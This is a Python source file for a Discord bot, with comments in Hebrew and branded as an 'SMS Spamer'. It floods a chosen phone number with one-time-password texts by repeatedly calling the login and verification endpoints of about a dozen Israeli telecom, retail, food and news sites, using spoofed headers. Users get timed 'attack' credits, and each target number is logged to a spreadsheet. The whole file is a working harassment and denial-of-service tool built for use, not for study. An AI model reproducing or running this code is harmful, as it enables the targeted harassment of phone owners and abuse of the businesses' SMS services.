import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio
import random
from datetime import datetime, timedelta

# --- הגדרות מערכת ---
TOKEN = os.getenv('DISCORD_TOKEN')
GSHEET_URL = os.getenv('GSHEET_URL') 
BLOCKED_NUMBER = "0535524017"

user_tokens = {} 
user_cooldowns = {}
active_attacks = {}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print(f"✅ המערכת עלתה לאוויר: {self.user.name}")

bot = CyberBot()

# --- מנוע הספאמר (התחמושת) ---
def api_call(url, data=None, method="POST", is_json=True):
    try:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Origin": "https://www.google.com",
            "Referer": "https://www.google.com/"
        }
        if method == "GET": r = requests.get(url, headers=headers, timeout=5)
        elif method == "PUT": r = requests.put(url, json=data, headers=headers, timeout=5)
        else:
            if is_json: r = requests.post(url, json=data, headers=headers, timeout=5)
            else: r = requests.post(url, data=data, headers=headers, timeout=5)
        return r.status_code in [200, 201]
    except:
        return False

async def fire_round(phone):
    tasks = [
        # סלקום
        asyncio.to_thread(api_call, "https://digital-api.cellcom.co.il/api/otp/LoginStep1", {"Subscriber": phone, "IsExtended": False, "ProcessType": "", "OtpOrigin": "main OTP"}, method="PUT"),
        # MyOfer
        asyncio.to_thread(api_call, "https://server.myofer.co.il/api/sendAuthSms", {"phoneNumber": phone}),
        # אופנה
        asyncio.to_thread(api_call, "https://www.nine-west.co.il/customer/ajax/post/", {"type": "login", "telephone": phone}, is_json=False),
        asyncio.to_thread(api_call, "https://www.timberland.co.il/customer/ajax/post/", {"type": "login", "telephone": phone}, is_json=False),
        asyncio.to_thread(api_call, "https://www.gali.co.il/customer/ajax/post/", {"type": "login", "telephone": phone}, is_json=False),
        asyncio.to_thread(api_call, "https://www.intima-il.co.il/customer/ajax/post/", {"type": "login", "telephone": phone}, is_json=False),
        asyncio.to_thread(api_call, "https://www.aldoshoes.co.il/customer/ajax/post/", {"type": "login", "telephone": phone}, is_json=False),
        # אוכל
        asyncio.to_thread(api_call, "https://app.burgeranch.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
        asyncio.to_thread(api_call, "https://www.papajohns.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
        # כללי
        asyncio.to_thread(api_call, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx", {"value": phone, "value_type": "phone"}, is_json=False),
        asyncio.to_thread(api_call, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
        asyncio.to_thread(api_call, f"https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/{phone}", method="GET")
    ]
    results = await asyncio.gather(*tasks)
    return sum(1 for r in results if r is True), sum(1 for r in results if r is False)

# --- לוגיקת ההרצה ---
async def run_attack(interaction, phone, minutes):
    uid = interaction.user.id
    active_attacks[uid] = True
    total_s, total_f = 0, 0
    end_time = datetime.now() + timedelta(minutes=minutes)
    
    await interaction.followup.send(f"🚀 **הפצצה החלה!** יעד: `{phone}`", ephemeral=True)

    while datetime.now() < end_time and active_attacks.get(uid):
        if user_tokens.get(uid, 0) <= 0: break
        
        s, f = await fire_round(phone)
        total_s += s
        total_f += f
        
        await asyncio.sleep(60) # הורדת טוקן (דקה) כל דקה
        user_tokens[uid] -= 1

    # שליחה לגוגל שיטס
    if GSHEET_URL:
        try:
            requests.post(GSHEET_URL, json={
                "user_name": interaction.user.name, "user_id": str(uid),
                "target_phone": phone, "rounds": f"{minutes} min",
                "success_count": total_s, "failed_count": total_f
            }, timeout=5)
        except: pass

    active_attacks.pop(uid, None)
    await interaction.followup.send(f"🏁 **ההפצצה הסתיימה!**\n✅ הצלחות: `{total_s}`", ephemeral=True)

# --- ממשק כפתורים (העיצוב החדש) ---
class CyberView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)

    @discord.ui.button(label="שגר הפצצה", style=discord.ButtonStyle.danger, emoji="🚀")
    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
        if user_tokens.get(interaction.user.id, 0) < 1:
            return await interaction.response.send_message("❌ אין לך טוקנים!", ephemeral=True)
            
        class InputModal(discord.ui.Modal, title="CyberIL - Launcher"):
            phone = discord.ui.TextInput(label="מספר טלפון", min_length=10, max_length=10)
            mins = discord.ui.TextInput(label="זמן (1-100 דקות)", default="5")
            async def on_submit(self, modal_inter: discord.Interaction):
                if self.phone.value == BLOCKED_NUMBER:
                    return await modal_inter.response.send_message("🚫 חסום!", ephemeral=True)
                await modal_inter.response.defer(ephemeral=True)
                asyncio.create_task(run_attack(modal_inter, self.phone.value, int(self.mins.value)))
        await interaction.response.send_modal(InputModal())

    @discord.ui.button(label="בדיקת מטבעות", style=discord.ButtonStyle.primary, emoji="💰")
    async def check(self, interaction: discord.Interaction, button: discord.ui.Button):
        bal = user_tokens.get(interaction.user.id, 0)
        await interaction.response.send_message(f"💰 יתרה: **{bal}** דקות.", ephemeral=True)

    @discord.ui.button(label="טוקן יומי", style=discord.ButtonStyle.success, emoji="🎁")
    async def gift(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        if uid not in user_cooldowns or datetime.now() >= user_cooldowns[uid]:
            user_tokens[uid] = user_tokens.get(uid, 0) + 5
            user_cooldowns[uid] = datetime.now() + timedelta(hours=24)
            await interaction.response.send_message("✅ קיבלת 5 דקות!", ephemeral=True)
        else:
            await interaction.response.send_message("⏳ כבר לקחת.", ephemeral=True)

    @discord.ui.button(label="עצור", style=discord.ButtonStyle.secondary, emoji="🛑")
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_attacks[interaction.user.id] = False
        await interaction.response.send_message("🛑 נעצר.", ephemeral=True)

# --- פקודות ---
@bot.tree.command(name="spamer-setup", description="לוח בקרה")
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(title="⚡ CyberIL SMS Spamer Control", color=0x2f3136)
    bal = user_tokens.get(interaction.user.id, 0)
    embed.add_field(name="📊 סטטיסטיקה", value=f"יתרה: `{bal}` דקות\nסטטוס שרת: `Online`", inline=False)
    embed.set_footer(text="CyberIL System | v2.5")
    embed.set_thumbnail(url="https://emojicdn.elk.sh/🤝")
    await interaction.response.send_message(embed=embed, view=CyberView())

@bot.tree.command(name="spamer-give", description="הענקת טוקנים")
async def give(interaction: discord.Interaction, user: discord.Member, amount: int):
    user_tokens[user.id] = user_tokens.get(user.id, 0) + amount
    await interaction.response.send_message(f"🎁 הוענקו {amount} דקות ל-{user.mention}.", ephemeral=True)

if __name__ == "__main__":
    bot.run(TOKEN)
